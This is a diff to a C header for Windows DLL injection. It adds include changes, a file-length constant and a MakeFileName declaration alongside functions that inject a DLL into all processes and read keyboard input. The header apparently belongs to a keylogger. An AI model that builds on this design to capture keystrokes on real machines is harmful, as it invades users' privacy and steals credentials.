@@ -5,10 +5,12 @@
 #define _CRT_SECURE_NO_WARNINGS
 #ifndef _INJECTION_HEADER_H__
 #define _INJECTION_HEADER_H__
-#include "windows.h"
-#include "stdio.h"
-#include "tlhelp32.h"
+#include <windows.h>
+#include <stdio.h>
+#include <tlhelp32.h>
+#include <time.h>
 #define MAX_PROCESS_NAME_LENGTH 260
+#define MAX_FILE_LENGTH 260
 #define GET_KEYBOARD_EVENT_FUNC "IsNewKeyHit"
 #define GET_KEYBOARD_VALUE_FUNC "GetKeyBoardValue"
 
@@ -39,4 +41,5 @@ BOOL InjectDll(DWORD, LPCTSTR);
 BOOL EjectDll(DWORD);
 BOOL InjectAllProcess(int, LPCTSTR);
 BOOL SearchProcess(int, DWORD, const char*,DWORD*);
+BOOL MakeFileName(char*);
 #endif
